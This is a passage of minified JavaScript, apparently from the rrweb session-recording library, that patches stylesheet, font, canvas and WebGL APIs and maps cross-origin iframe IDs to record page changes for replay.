        const a = r.CSSStyleSheet.prototype.deleteRule;
        r.CSSStyleSheet.prototype.deleteRule = function (u) {
            const {id: d, styleId: h} = fe(this, e, n.styleMirror);
            return (d && d !== -1 || h && h !== -1) && t({id: d, styleId: h, removes: [{index: u}]}), a.apply(this, [u])
        };
        let s;
        r.CSSStyleSheet.prototype.replace && (s = r.CSSStyleSheet.prototype.replace, r.CSSStyleSheet.prototype.replace = function (u) {
            const {id: d, styleId: h} = fe(this, e, n.styleMirror);
            return (d && d !== -1 || h && h !== -1) && t({id: d, styleId: h, replace: u}), s.apply(this, [u])
        });
        let i;
        r.CSSStyleSheet.prototype.replaceSync && (i = r.CSSStyleSheet.prototype.replaceSync, r.CSSStyleSheet.prototype.replaceSync = function (u) {
            const {id: d, styleId: h} = fe(this, e, n.styleMirror);
            return (d && d !== -1 || h && h !== -1) && t({id: d, styleId: h, replaceSync: u}), i.apply(this, [u])
        });
        const l = {};
        Qt ? l.CSSGroupingRule = r.CSSGroupingRule : (Jt && (l.CSSMediaRule = r.CSSMediaRule), en && (l.CSSConditionRule = r.CSSConditionRule), qt && (l.CSSSupportsRule = r.CSSSupportsRule));
        const c = {};
        return Object.entries(l).forEach(([u, d]) => {
            c[u] = {
                insertRule: d.prototype.insertRule,
                deleteRule: d.prototype.deleteRule
            }, d.prototype.insertRule = function (h, p) {
                const {id: m, styleId: b} = fe(this.parentStyleSheet, e, n.styleMirror);
                return (m && m !== -1 || b && b !== -1) && t({
                    id: m,
                    styleId: b,
                    adds: [{rule: h, index: [...ze(this), p || 0]}]
                }), c[u].insertRule.apply(this, [h, p])
            }, d.prototype.deleteRule = function (h) {
                const {id: p, styleId: m} = fe(this.parentStyleSheet, e, n.styleMirror);
                return (p && p !== -1 || m && m !== -1) && t({
                    id: p,
                    styleId: m,
                    removes: [{index: [...ze(this), h]}]
                }), c[u].deleteRule.apply(this, [h])
            }
        }), () => {
            r.CSSStyleSheet.prototype.insertRule = o, r.CSSStyleSheet.prototype.deleteRule = a, s && (r.CSSStyleSheet.prototype.replace = s), i && (r.CSSStyleSheet.prototype.replaceSync = i), Object.entries(l).forEach(([u, d]) => {
                d.prototype.insertRule = c[u].insertRule, d.prototype.deleteRule = c[u].deleteRule
            })
        }
    }

    function sn({mirror: t, stylesheetManager: e}, n) {
        var r, o, a;
        let s = null;
        n.nodeName === "#document" ? s = t.getId(n) : s = t.getId(n.host);
        const i = n.nodeName === "#document" ? (r = n.defaultView) == null ? void 0 : r.Document : (a = (o = n.ownerDocument) == null ? void 0 : o.defaultView) == null ? void 0 : a.ShadowRoot,
            l = Object.getOwnPropertyDescriptor(i?.prototype, "adoptedStyleSheets");
        return s === null || s === -1 || !i || !l ? () => {
        } : (Object.defineProperty(n, "adoptedStyleSheets", {
            configurable: l.configurable,
            enumerable: l.enumerable,
            get() {
                var c;
                return (c = l.get) == null ? void 0 : c.call(this)
            },
            set(c) {
                var u;
                const d = (u = l.set) == null ? void 0 : u.call(this, c);
                if (s !== null && s !== -1) try {
                    e.adoptStyleSheets(c, s)
                } catch {
                }
                return d
            }
        }), () => {
            Object.defineProperty(n, "adoptedStyleSheets", {
                configurable: l.configurable,
                enumerable: l.enumerable,
                get: l.get,
                set: l.set
            })
        })
    }

    function Gr({styleDeclarationCb: t, mirror: e, ignoreCSSAttributes: n, stylesheetManager: r}, {win: o}) {
        const a = o.CSSStyleDeclaration.prototype.setProperty;
        o.CSSStyleDeclaration.prototype.setProperty = function (i, l, c) {
            var u;
            if (n.has(i)) return a.apply(this, [i, l, c]);
            const {
                id: d,
                styleId: h
            } = fe((u = this.parentRule) == null ? void 0 : u.parentStyleSheet, e, r.styleMirror);
            return (d && d !== -1 || h && h !== -1) && t({
                id: d,
                styleId: h,
                set: {property: i, value: l, priority: c},
                index: ze(this.parentRule)
            }), a.apply(this, [i, l, c])
        };
        const s = o.CSSStyleDeclaration.prototype.removeProperty;
        return o.CSSStyleDeclaration.prototype.removeProperty = function (i) {
            var l;
            if (n.has(i)) return s.apply(this, [i]);
            const {
                id: c,
                styleId: u
            } = fe((l = this.parentRule) == null ? void 0 : l.parentStyleSheet, e, r.styleMirror);
            return (c && c !== -1 || u && u !== -1) && t({
                id: c,
                styleId: u,
                remove: {property: i},
                index: ze(this.parentRule)
            }), s.apply(this, [i])
        }, () => {
            o.CSSStyleDeclaration.prototype.setProperty = a, o.CSSStyleDeclaration.prototype.removeProperty = s
        }
    }

    function jr({mediaInteractionCb: t, blockClass: e, blockSelector: n, mirror: r, sampling: o}) {
        const a = i => Ce(l => {
                const c = Pe(l);
                if (!c || Q(c, e, n, !0)) return;
                const {currentTime: u, volume: d, muted: h, playbackRate: p} = c;
                t({type: i, id: r.getId(c), currentTime: u, volume: d, muted: h, playbackRate: p})
            }, o.media || 500),
            s = [K("play", a(me.Play)), K("pause", a(me.Pause)), K("seeked", a(me.Seeked)), K("volumechange", a(me.VolumeChange)), K("ratechange", a(me.RateChange))];
        return () => {
            s.forEach(i => i())
        }
    }

    function zr({fontCb: t, doc: e}) {
        const n = e.defaultView;
        if (!n) return () => {
        };
        const r = [], o = new WeakMap, a = n.FontFace;
        n.FontFace = function (i, l, c) {
            const u = new a(i, l, c);
            return o.set(u, {
                family: i,
                buffer: typeof l != "string",
                descriptors: c,
                fontSource: typeof l == "string" ? l : JSON.stringify(Array.from(new Uint8Array(l)))
            }), u
        };
        const s = ge(e.fonts, "add", function (i) {
            return function (l) {
                return setTimeout(() => {
                    const c = o.get(l);
                    c && (t(c), o.delete(l))
                }, 0), i.apply(this, [l])
            }
        });
        return r.push(() => {
            n.FontFace = a
        }), r.push(s), () => {
            r.forEach(i => i())
        }
    }

    function Hr(t) {
        const {doc: e, mirror: n, blockClass: r, blockSelector: o, selectionCb: a} = t;
        let s = !0;
        const i = () => {
            const l = e.getSelection();
            if (!l || s && l?.isCollapsed) return;
            s = l.isCollapsed || !1;
            const c = [], u = l.rangeCount || 0;
            for (let d = 0; d < u; d++) {
                const h = l.getRangeAt(d), {startContainer: p, startOffset: m, endContainer: b, endOffset: S} = h;
                Q(p, r, o, !0) || Q(b, r, o, !0) || c.push({
                    start: n.getId(p),
                    startOffset: m,
                    end: n.getId(b),
                    endOffset: S
                })
            }
            a({ranges: c})
        };
        return i(), K("selectionchange", i)
    }

    function Yr(t, e) {
        const {
            mutationCb: n,
            mousemoveCb: r,
            mouseInteractionCb: o,
            scrollCb: a,
            viewportResizeCb: s,
            inputCb: i,
            mediaInteractionCb: l,
            styleSheetRuleCb: c,
            styleDeclarationCb: u,
            canvasMutationCb: d,
            fontCb: h,
            selectionCb: p
        } = t;
        t.mutationCb = (...m) => {
            e.mutation && e.mutation(...m), n(...m)
        }, t.mousemoveCb = (...m) => {
            e.mousemove && e.mousemove(...m), r(...m)
        }, t.mouseInteractionCb = (...m) => {
            e.mouseInteraction && e.mouseInteraction(...m), o(...m)
        }, t.scrollCb = (...m) => {
            e.scroll && e.scroll(...m), a(...m)
        }, t.viewportResizeCb = (...m) => {
            e.viewportResize && e.viewportResize(...m), s(...m)
        }, t.inputCb = (...m) => {
            e.input && e.input(...m), i(...m)
        }, t.mediaInteractionCb = (...m) => {
            e.mediaInteaction && e.mediaInteaction(...m), l(...m)
        }, t.styleSheetRuleCb = (...m) => {
            e.styleSheetRule && e.styleSheetRule(...m), c(...m)
        }, t.styleDeclarationCb = (...m) => {
            e.styleDeclaration && e.styleDeclaration(...m), u(...m)
        }, t.canvasMutationCb = (...m) => {
            e.canvasMutation && e.canvasMutation(...m), d(...m)
        }, t.fontCb = (...m) => {
            e.font && e.font(...m), h(...m)
        }, t.selectionCb = (...m) => {
            e.selection && e.selection(...m), p(...m)
        }
    }

    function Xr(t, e = {}) {
        const n = t.doc.defaultView;
        if (!n) return () => {
        };
        Yr(t, e);
        const r = tn(t, t.doc), o = Pr(t), a = Wr(t), s = nn(t), i = $r(t), l = Vr(t), c = jr(t), u = Br(t, {win: n}),
            d = sn(t, t.doc), h = Gr(t, {win: n}), p = t.collectFonts ? zr(t) : () => {
            }, m = Hr(t), b = [];
        for (const S of t.plugins) b.push(S.observer(S.callback, n, S.options));
        return () => {
            Se.forEach(S => S.reset()), r.disconnect(), o(), a(), s(), i(), l(), c(), u(), d(), h(), p(), m(), b.forEach(S => S())
        }
    }

    class an {
        constructor(e) {
            this.generateIdFn = e, this.iframeIdToRemoteIdMap = new WeakMap, this.iframeRemoteIdToIdMap = new WeakMap
        }

        getId(e, n, r, o) {
            const a = r || this.getIdToRemoteIdMap(e), s = o || this.getRemoteIdToIdMap(e);
            let i = a.get(n);
            return i || (i = this.generateIdFn(), a.set(n, i), s.set(i, n)), i
        }

        getIds(e, n) {
            const r = this.getIdToRemoteIdMap(e), o = this.getRemoteIdToIdMap(e);
            return n.map(a => this.getId(e, a, r, o))
        }

        getRemoteId(e, n, r) {
            const o = r || this.getRemoteIdToIdMap(e);
            return typeof n != "number" ? n : o.get(n) || -1
        }

        getRemoteIds(e, n) {
            const r = this.getRemoteIdToIdMap(e);
            return n.map(o => this.getRemoteId(e, o, r))
        }

        reset(e) {
            if (!e) {
                this.iframeIdToRemoteIdMap = new WeakMap, this.iframeRemoteIdToIdMap = new WeakMap;
                return
            }
            this.iframeIdToRemoteIdMap.delete(e), this.iframeRemoteIdToIdMap.delete(e)
        }

        getIdToRemoteIdMap(e) {
            let n = this.iframeIdToRemoteIdMap.get(e);
            return n || (n = new Map, this.iframeIdToRemoteIdMap.set(e, n)), n
        }

        getRemoteIdToIdMap(e) {
            let n = this.iframeRemoteIdToIdMap.get(e);
            return n || (n = new Map, this.iframeRemoteIdToIdMap.set(e, n)), n
        }
    }

    class Zr {
        constructor(e) {
            this.iframes = new WeakMap, this.crossOriginIframeMap = new WeakMap, this.crossOriginIframeMirror = new an(Rt), this.mutationCb = e.mutationCb, this.wrappedEmit = e.wrappedEmit, this.stylesheetManager = e.stylesheetManager, this.recordCrossOriginIframes = e.recordCrossOriginIframes, this.crossOriginIframeStyleMirror = new an(this.stylesheetManager.styleMirror.generateId.bind(this.stylesheetManager.styleMirror)), this.mirror = e.mirror, this.recordCrossOriginIframes && window.addEventListener("message", this.handleMessage.bind(this))
        }

        addIframe(e) {
            this.iframes.set(e, !0), e.contentWindow && this.crossOriginIframeMap.set(e.contentWindow, e)
        }

        addLoadListener(e) {
            this.loadListener = e
        }

        attachIframe(e, n) {
            var r;
            this.mutationCb({
                adds: [{parentId: this.mirror.getId(e), nextId: null, node: n}],
                removes: [],
                texts: [],
                attributes: [],
                isAttachIframe: !0
            }), (r = this.loadListener) == null || r.call(this, e), e.contentDocument && e.contentDocument.adoptedStyleSheets && e.contentDocument.adoptedStyleSheets.length > 0 && this.stylesheetManager.adoptStyleSheets(e.contentDocument.adoptedStyleSheets, this.mirror.getId(e.contentDocument))
        }

        handleMessage(e) {
            if (e.data.type === "rrweb") {
                if (!e.source) return;
                const n = this.crossOriginIframeMap.get(e.source);
                if (!n) return;
                const r = this.transformCrossOriginEvent(n, e.data.event);
                r && this.wrappedEmit(r, e.data.isCheckout)
            }
        }

        transformCrossOriginEvent(e, n) {
            var r;
            switch (n.type) {
                case C.FullSnapshot:
                    return this.crossOriginIframeMirror.reset(e), this.crossOriginIframeStyleMirror.reset(e), this.replaceIdOnNode(n.data.node, e), {
                        timestamp: n.timestamp,
                        type: C.IncrementalSnapshot,
                        data: {
                            source: N.Mutation,
                            adds: [{parentId: this.mirror.getId(e), nextId: null, node: n.data.node}],
                            removes: [],
                            texts: [],
                            attributes: [],
                            isAttachIframe: !0
                        }
                    };
                case C.Meta:
                case C.Load:
                case C.DomContentLoaded:
                    return !1;
                case C.Plugin:
                    return n;
                case C.Custom:
                    return this.replaceIds(n.data.payload, e, ["id", "parentId", "previousId", "nextId"]), n;
                case C.IncrementalSnapshot:
                    switch (n.data.source) {
                        case N.Mutation:
                            return n.data.adds.forEach(o => {
                                this.replaceIds(o, e, ["parentId", "nextId", "previousId"]), this.replaceIdOnNode(o.node, e)
                            }), n.data.removes.forEach(o => {
                                this.replaceIds(o, e, ["parentId", "id"])
                            }), n.data.attributes.forEach(o => {
                                this.replaceIds(o, e, ["id"])
                            }), n.data.texts.forEach(o => {
                                this.replaceIds(o, e, ["id"])
                            }), n;
                        case N.Drag:
                        case N.TouchMove:
                        case N.MouseMove:
                            return n.data.positions.forEach(o => {
                                this.replaceIds(o, e, ["id"])
                            }), n;
                        case N.ViewportResize:
                            return !1;
                        case N.MediaInteraction:
                        case N.MouseInteraction:
                        case N.Scroll:
                        case N.CanvasMutation:
                        case N.Input:
                            return this.replaceIds(n.data, e, ["id"]), n;
                        case N.StyleSheetRule:
                        case N.StyleDeclaration:
                            return this.replaceIds(n.data, e, ["id"]), this.replaceStyleIds(n.data, e, ["styleId"]), n;
                        case N.Font:
                            return n;
                        case N.Selection:
                            return n.data.ranges.forEach(o => {
                                this.replaceIds(o, e, ["start", "end"])
                            }), n;
                        case N.AdoptedStyleSheet:
                            return this.replaceIds(n.data, e, ["id"]), this.replaceStyleIds(n.data, e, ["styleIds"]), (r = n.data.styles) == null || r.forEach(o => {
                                this.replaceStyleIds(o, e, ["styleId"])
                            }), n
                    }
            }
        }

        replace(e, n, r, o) {
            for (const a of o) !Array.isArray(n[a]) && typeof n[a] != "number" || (Array.isArray(n[a]) ? n[a] = e.getIds(r, n[a]) : n[a] = e.getId(r, n[a]));
            return n
        }

        replaceIds(e, n, r) {
            return this.replace(this.crossOriginIframeMirror, e, n, r)
        }

        replaceStyleIds(e, n, r) {
            return this.replace(this.crossOriginIframeStyleMirror, e, n, r)
        }

        replaceIdOnNode(e, n) {
            this.replaceIds(e, n, ["id"]), "childNodes" in e && e.childNodes.forEach(r => {
                this.replaceIdOnNode(r, n)
            })
        }
    }

    var Kr = Object.defineProperty, Qr = Object.defineProperties, Jr = Object.getOwnPropertyDescriptors,
        ln = Object.getOwnPropertySymbols, qr = Object.prototype.hasOwnProperty,
        eo = Object.prototype.propertyIsEnumerable,
        cn = (t, e, n) => e in t ? Kr(t, e, {enumerable: !0, configurable: !0, writable: !0, value: n}) : t[e] = n,
        un = (t, e) => {
            for (var n in e || (e = {})) qr.call(e, n) && cn(t, n, e[n]);
            if (ln) for (var n of ln(e)) eo.call(e, n) && cn(t, n, e[n]);
            return t
        }, dn = (t, e) => Qr(t, Jr(e));

    class to {
        constructor(e) {
            this.shadowDoms = new WeakSet, this.restorePatches = [], this.mutationCb = e.mutationCb, this.scrollCb = e.scrollCb, this.bypassOptions = e.bypassOptions, this.mirror = e.mirror;
            const n = this;
            this.restorePatches.push(ge(Element.prototype, "attachShadow", function (r) {
                return function (o) {
                    const a = r.call(this, o);
                    return this.shadowRoot && n.addShadowRoot(this.shadowRoot, this.ownerDocument), a
                }
            }))
        }

        addShadowRoot(e, n) {
            !Le(e) || this.shadowDoms.has(e) || (this.shadowDoms.add(e), tn(dn(un({}, this.bypassOptions), {
                doc: n,
                mutationCb: this.mutationCb,
                mirror: this.mirror,
                shadowDomManager: this
            }), e), nn(dn(un({}, this.bypassOptions), {
                scrollCb: this.scrollCb,
                doc: e,
                mirror: this.mirror
            })), setTimeout(() => {
                e.adoptedStyleSheets && e.adoptedStyleSheets.length > 0 && this.bypassOptions.stylesheetManager.adoptStyleSheets(e.adoptedStyleSheets, this.mirror.getId(e.host)), sn({
                    mirror: this.mirror,
                    stylesheetManager: this.bypassOptions.stylesheetManager
                }, e)
            }, 0))
        }

        observeAttachShadow(e) {
            if (e.contentWindow) {
                const n = this;
                this.restorePatches.push(ge(e.contentWindow.HTMLElement.prototype, "attachShadow", function (r) {
                    return function (o) {
                        const a = r.call(this, o);
                        return this.shadowRoot && n.addShadowRoot(this.shadowRoot, e.contentDocument), a
                    }
                }))
            }
        }

        reset() {
            this.restorePatches.forEach(e => e()), this.shadowDoms = new WeakSet
        }
    }

    for (var Me = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", We = typeof Uint8Array > "u" ? [] : new Uint8Array(256), He = 0; He < Me.length; He++) We[Me.charCodeAt(He)] = He;
    var no = function (t) {
        var e = new Uint8Array(t), n, r = e.length, o = "";
        for (n = 0; n < r; n += 3) o += Me[e[n] >> 2], o += Me[(e[n] & 3) << 4 | e[n + 1] >> 4], o += Me[(e[n + 1] & 15) << 2 | e[n + 2] >> 6], o += Me[e[n + 2] & 63];
        return r % 3 === 2 ? o = o.substring(0, o.length - 1) + "=" : r % 3 === 1 && (o = o.substring(0, o.length - 2) + "=="), o
    }, ro = function (t) {
        var e = t.length * .75, n = t.length, r, o = 0, a, s, i, l;
        t[t.length - 1] === "=" && (e--, t[t.length - 2] === "=" && e--);
        var c = new ArrayBuffer(e), u = new Uint8Array(c);
        for (r = 0; r < n; r += 4) a = We[t.charCodeAt(r)], s = We[t.charCodeAt(r + 1)], i = We[t.charCodeAt(r + 2)], l = We[t.charCodeAt(r + 3)], u[o++] = a << 2 | s >> 4, u[o++] = (s & 15) << 4 | i >> 2, u[o++] = (i & 3) << 6 | l & 63;
        return c
    };
    const hn = new Map;

    function oo(t, e) {
        let n = hn.get(t);
        return n || (n = new Map, hn.set(t, n)), n.has(e) || n.set(e, []), n.get(e)
    }

    const pn = (t, e, n) => {
        if (!t || !(fn(t, e) || typeof t == "object")) return;
        const r = t.constructor.name, o = oo(n, r);
        let a = o.indexOf(t);
        return a === -1 && (a = o.length, o.push(t)), a
    };

    function Ye(t, e, n) {
        if (t instanceof Array) return t.map(r => Ye(r, e, n));
        if (t === null) return t;
        if (t instanceof Float32Array || t instanceof Float64Array || t instanceof Int32Array || t instanceof Uint32Array || t instanceof Uint8Array || t instanceof Uint16Array || t instanceof Int16Array || t instanceof Int8Array || t instanceof Uint8ClampedArray) return {
            rr_type: t.constructor.name,
            args: [Object.values(t)]
        };
        if (t instanceof ArrayBuffer) {
            const r = t.constructor.name, o = no(t);
            return {rr_type: r, base64: o}
        } else {
            if (t instanceof DataView) return {
                rr_type: t.constructor.name,
                args: [Ye(t.buffer, e, n), t.byteOffset, t.byteLength]
            };
            if (t instanceof HTMLImageElement) {
                const r = t.constructor.name, {src: o} = t;
                return {rr_type: r, src: o}
            } else if (t instanceof HTMLCanvasElement) {
                const r = "HTMLImageElement", o = t.toDataURL();
                return {rr_type: r, src: o}
            } else {
                if (t instanceof ImageData) return {
                    rr_type: t.constructor.name,
                    args: [Ye(t.data, e, n), t.width, t.height]
                };
                if (fn(t, e) || typeof t == "object") {
                    const r = t.constructor.name, o = pn(t, e, n);
                    return {rr_type: r, index: o}
                }
            }
        }
        return t
    }

    const mn = (t, e, n) => [...t].map(r => Ye(r, e, n)), fn = (t, e) => {
        const n = ["WebGLActiveInfo", "WebGLBuffer", "WebGLFramebuffer", "WebGLProgram", "WebGLRenderbuffer", "WebGLShader", "WebGLShaderPrecisionFormat", "WebGLTexture", "WebGLUniformLocation", "WebGLVertexArrayObject", "WebGLVertexArrayObjectOES"].filter(r => typeof e[r] == "function");
        return Boolean(n.find(r => t instanceof e[r]))
    };

    function so(t, e, n, r) {
        const o = [], a = Object.getOwnPropertyNames(e.CanvasRenderingContext2D.prototype);
        for (const s of a) try {
            if (typeof e.CanvasRenderingContext2D.prototype[s] != "function") continue;
            const i = ge(e.CanvasRenderingContext2D.prototype, s, function (l) {
                return function (...c) {
                    return Q(this.canvas, n, r, !0) || setTimeout(() => {
                        const u = mn([...c], e, this);
                        t(this.canvas, {type: pe["2D"], property: s, args: u})
                    }, 0), l.apply(this, c)
                }
            });
            o.push(i)
        } catch {
            const l = Fe(e.CanvasRenderingContext2D.prototype, s, {
                set(c) {
                    t(this.canvas, {type: pe["2D"], property: s, args: [c], setter: !0})
                }
            });
            o.push(l)
        }
        return () => {
            o.forEach(s => s())
        }
    }

    function yn(t, e, n) {
        const r = [];
        try {
            const o = ge(t.HTMLCanvasElement.prototype, "getContext", function (a) {
                return function (s, ...i) {
                    return Q(this, e, n, !0) || "__context" in this || (this.__context = s), a.apply(this, [s, ...i])
                }
            });
            r.push(o)
        } catch {
            console.error("failed to patch HTMLCanvasElement.prototype.getContext")
        }
        return () => {
            r.forEach(o => o())
        }
    }

    function gn(t, e, n, r, o, a, s) {
        const i = [], l = Object.getOwnPropertyNames(t);
        for (const c of l) if (!["isContextLost", "canvas", "drawingBufferWidth", "drawingBufferHeight"].includes(c)) try {
            if (typeof t[c] != "function") continue;
            const u = ge(t, c, function (d) {
                return function (...h) {
                    const p = d.apply(this, h);
                    if (pn(p, s, this), !Q(this.canvas, r, o, !0)) {
                        const m = mn([...h], s, this), b = {type: e, property: c, args: m};
                        n(this.canvas, b)
                    }
                    return p
                }
            });
            i.push(u)
        } catch {
            const d = Fe(t, c, {
                set(h) {
                    n(this.canvas, {type: e, property: c, args: [h], setter: !0})
                }
            });
            i.push(d)
        }
        return i
    }

    function io(t, e, n, r, o) {
        const a = [];
        return a.push(...gn(e.WebGLRenderingContext.prototype, pe.WebGL, t, n, r, o, e)), typeof e.WebGL2RenderingContext < "u" && a.push(...gn(e.WebGL2RenderingContext.prototype, pe.WebGL2, t, n, r, o, e)), () => {
            a.forEach(s => s())
        }
    }

    function ao(t, e) {
        var n = atob(t);
        if (e) {
            for (var r = new Uint8Array(n.length), o = 0, a = n.length; o < a; ++o) r[o] = n.charCodeAt(o);
            return String.fromCharCode.apply(null, new Uint16Array(r.buffer))
        }
        return n
    }

    function lo(t, e, n) {
        var r = e === void 0 ? null : e, o = n === void 0 ? !1 : n, a = ao(t, o), s = a.indexOf(`
`, 10) + 1, i = a.substring(s) + (r ? "//# sourceMappingURL=" + r : ""),
            l = new Blob([i], {type: "application/javascript"});
        return URL.createObjectURL(l)
    }

    function co(t, e, n) {
        var r;
        return function (a) {
            return r = r || lo(t, e, n), new Worker(r, a)
        }
    }

    var uo = co("Lyogcm9sbHVwLXBsdWdpbi13ZWItd29ya2VyLWxvYWRlciAqLwooZnVuY3Rpb24oKXsidXNlIHN0cmljdCI7Zm9yKHZhciByPSJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvIixwPXR5cGVvZiBVaW50OEFycmF5PiJ1Ij9bXTpuZXcgVWludDhBcnJheSgyNTYpLGY9MDtmPHIubGVuZ3RoO2YrKylwW3IuY2hhckNvZGVBdChmKV09Zjt2YXIgdT1mdW5jdGlvbihzKXt2YXIgZT1uZXcgVWludDhBcnJheShzKSxuLGE9ZS5sZW5ndGgsdD0iIjtmb3Iobj0wO248YTtuKz0zKXQrPXJbZVtuXT4+Ml0sdCs9clsoZVtuXSYzKTw8NHxlW24rMV0+PjRdLHQrPXJbKGVbbisxXSYxNSk8PDJ8ZVtuKzJdPj42XSx0Kz1yW2VbbisyXSY2M107cmV0dXJuIGElMz09PTI/dD10LnN1YnN0cmluZygwLHQubGVuZ3RoLTEpKyI9IjphJTM9PT0xJiYodD10LnN1YnN0cmluZygwLHQubGVuZ3RoLTIpKyI9PSIpLHR9O2NvbnN0IGM9bmV3IE1hcCxsPW5ldyBNYXA7YXN5bmMgZnVuY3Rpb24gdihzLGUsbil7Y29uc3QgYT1gJHtzfS0ke2V9YDtpZigiT2Zmc2NyZWVuQ2FudmFzImluIGdsb2JhbFRoaXMpe2lmKGwuaGFzKGEpKXJldHVybiBsLmdldChhKTtjb25zdCB0PW5ldyBPZmZzY3JlZW5DYW52YXMocyxlKTt0LmdldENvbnRleHQoIjJkIik7Y29uc3QgZz1hd2FpdChhd2FpdCB0LmNvbnZlcnRUb0Jsb2IobikpLmFycmF5QnVmZmVyKCksZD11KGcpO3JldHVybiBsLnNldChhLGQpLGR9ZWxzZSByZXR1cm4iIn1jb25zdCBpPXNlbGY7aS5vbm1lc3NhZ2U9YXN5bmMgZnVuY3Rpb24ocyl7aWYoIk9mZnNjcmVlbkNhbnZhcyJpbiBnbG9iYWxUaGlzKXtjb25zdHtpZDplLGJpdG1hcDpuLHdpZHRoOmEsaGVpZ2h0OnQsZGF0YVVSTE9wdGlvbnM6Z309cy5kYXRhLGQ9dihhLHQsZyksaD1uZXcgT2Zmc2NyZWVuQ2FudmFzKGEsdCk7aC5nZXRDb250ZXh0KCIyZCIpLmRyYXdJbWFnZShuLDAsMCksbi5jbG9zZSgpO2NvbnN0IHc9YXdhaXQgaC5jb252ZXJ0VG9CbG9iKGcpLHk9dy50eXBlLGI9YXdhaXQgdy5hcnJheUJ1ZmZlcigpLG89dShiKTtpZighYy5oYXMoZSkmJmF3YWl0IGQ9PT1vKXJldHVybiBjLnNldChlLG8pLGkucG9zdE1lc3NhZ2Uoe2lkOmV9KTtpZihjLmdldChlKT09PW8pcmV0dXJuIGkucG9zdE1lc3NhZ2Uoe2lkOmV9KTtpLnBvc3RNZXNzYWdlKHtpZDplLHR5cGU6eSxiYXNlNjQ6byx3aWR0aDphLGhlaWdodDp0fSksYy5zZXQoZSxvKX1lbHNlIHJldHVybiBpLnBvc3RNZXNzYWdlKHtpZDpzLmRhdGEuaWR9KX19KSgpOwoK", null, !1),
        vn = Object.getOwnPropertySymbols, ho = Object.prototype.hasOwnProperty,
        po = Object.prototype.propertyIsEnumerable, mo = (t, e) => {
            var n = {};
            for (var r in t) ho.call(t, r) && e.indexOf(r) < 0 && (n[r] = t[r]);
            if (t != null && vn) for (var r of vn(t)) e.indexOf(r) < 0 && po.call(t, r) && (n[r] = t[r]);
            return n
        }, fo = (t, e, n) => new Promise((r, o) => {
            var a = l => {
                try {
                    i(n.next(l))
                } catch (c) {
                    o(c)
                }
            }, s = l => {
                try {
                    i(n.throw(l))
                } catch (c) {
                    o(c)
                }
            }, i = l => l.done ? r(l.value) : Promise.resolve(l.value).then(a, s);
            i((n = n.apply(t, e)).next())
        });

    class yo {
        constructor(e) {
            this.pendingCanvasMutations = new Map, this.rafStamps = {
                latestId: 0,
                invokeId: null
            }, this.frozen = !1, this.locked = !1, this.processMutation = (l, c) => {
                (this.rafStamps.invokeId && this.rafStamps.latestId !== this.rafStamps.invokeId || !this.rafStamps.invokeId) && (this.rafStamps.invokeId = this.rafStamps.latestId), this.pendingCanvasMutations.has(l) || this.pendingCanvasMutations.set(l, []), this.pendingCanvasMutations.get(l).push(c)
            };
            const {
                sampling: n = "all",
                win: r,
                blockClass: o,
                blockSelector: a,
                recordCanvas: s,
                dataURLOptions: i
            } = e;
            this.mutationCb = e.mutationCb, this.mirror = e.mirror, s && n === "all" && this.initCanvasMutationObserver(r, o, a), s && typeof n == "number" && this.initCanvasFPSObserver(n, r, o, a, {dataURLOptions: i})
        }

        reset() {
            this.pendingCanvasMutations.clear(), this.resetObservers && this.resetObservers()
        }

        freeze() {
            this.frozen = !0
        }

        unfreeze() {
            this.frozen = !1
        }

        lock() {
            this.locked = !0
        }

        unlock() {
            this.locked = !1
        }

        initCanvasFPSObserver(e, n, r, o, a) {
            const s = yn(n, r, o), i = new Map, l = new uo;
            l.onmessage = m => {
                const {id: b} = m.data;
                if (i.set(b, !1), !("base64" in m.data)) return;
                const {base64: S, type: f, width: y, height: g} = m.data;
                this.mutationCb({
                    id: b,
                    type: pe["2D"],
                    commands: [{property: "clearRect", args: [0, 0, y, g]}, {
                        property: "drawImage",
                        args: [{
                            rr_type: "ImageBitmap",
                            args: [{rr_type: "Blob", data: [{rr_type: "ArrayBuffer", base64: S}], type: f}]
                        }, 0, 0]
                    }]
                })
            };
            const c = 1e3 / e;
            let u = 0, d;
            const h = () => {
                const m = [];
                return n.document.querySelectorAll("canvas").forEach(b => {
                    Q(b, r, o, !0) || m.push(b)
                }), m
            }, p = m => {
                if (u && m - u < c) {
                    d = requestAnimationFrame(p);
                    return
                }
                u = m, h().forEach(b => fo(this, null, function* () {
                    var S;
                    const f = this.mirror.getId(b);
                    if (i.get(f)) return;
                    if (i.set(f, !0), ["webgl", "webgl2"].includes(b.__context)) {
                        const g = b.getContext(b.__context);
                        ((S = g?.getContextAttributes()) == null ? void 0 : S.preserveDrawingBuffer) === !1 && g?.clear(g.COLOR_BUFFER_BIT)
                    }
                    const y = yield createImageBitmap(b);
                    l.postMessage({
                        id: f,
                        bitmap: y,
                        width: b.width,
                        height: b.height,
                        dataURLOptions: a.dataURLOptions
                    }, [y])
                })), d = requestAnimationFrame(p)
            };
            d = requestAnimationFrame(p), this.resetObservers = () => {
                s(), cancelAnimationFrame(d)
            }
        }

        initCanvasMutationObserver(e, n, r) {
            this.startRAFTimestamping(), this.startPendingCanvasMutationFlusher();
            const o = yn(e, n, r), a = so(this.processMutation.bind(this), e, n, r),
                s = io(this.processMutation.bind(this), e, n, r, this.mirror);
            this.resetObservers = () => {
                o(), a(), s()
            }
        }

        startPendingCanvasMutationFlusher() {
            requestAnimationFrame(() => this.flushPendingCanvasMutations())
        }

        startRAFTimestamping() {
            const e = n => {
                this.rafStamps.latestId = n, requestAnimationFrame(e)
            };
            requestAnimationFrame(e)
        }

        flushPendingCanvasMutations() {
            this.pendingCanvasMutations.forEach((e, n) => {
                const r = this.mirror.getId(n);
                this.flushPendingCanvasMutationFor(n, r)
            }), requestAnimationFrame(() => this.flushPendingCanvasMutations())
        }

        flushPendingCanvasMutationFor(e, n) {
            if (this.frozen || this.locked) return;
            const r = this.pendingCanvasMutations.get(e);
            if (!r || n === -1) return;
            const o = r.map(s => mo(s, ["type"])), {type: a} = r[0];
            this.mutationCb({id: n, type: a, commands: o}), this.pendingCanvasMutations.delete(e)
        }
    }

    class go {
        constructor(e) {
            this.trackedLinkElements = new WeakSet, this.styleMirror = new ht, this.mutationCb = e.mutationCb, this.adoptedStyleSheetCb = e.adoptedStyleSheetCb
        }

        attachLinkElement(e, n) {
            "_cssText" in n.attributes && this.mutationCb({
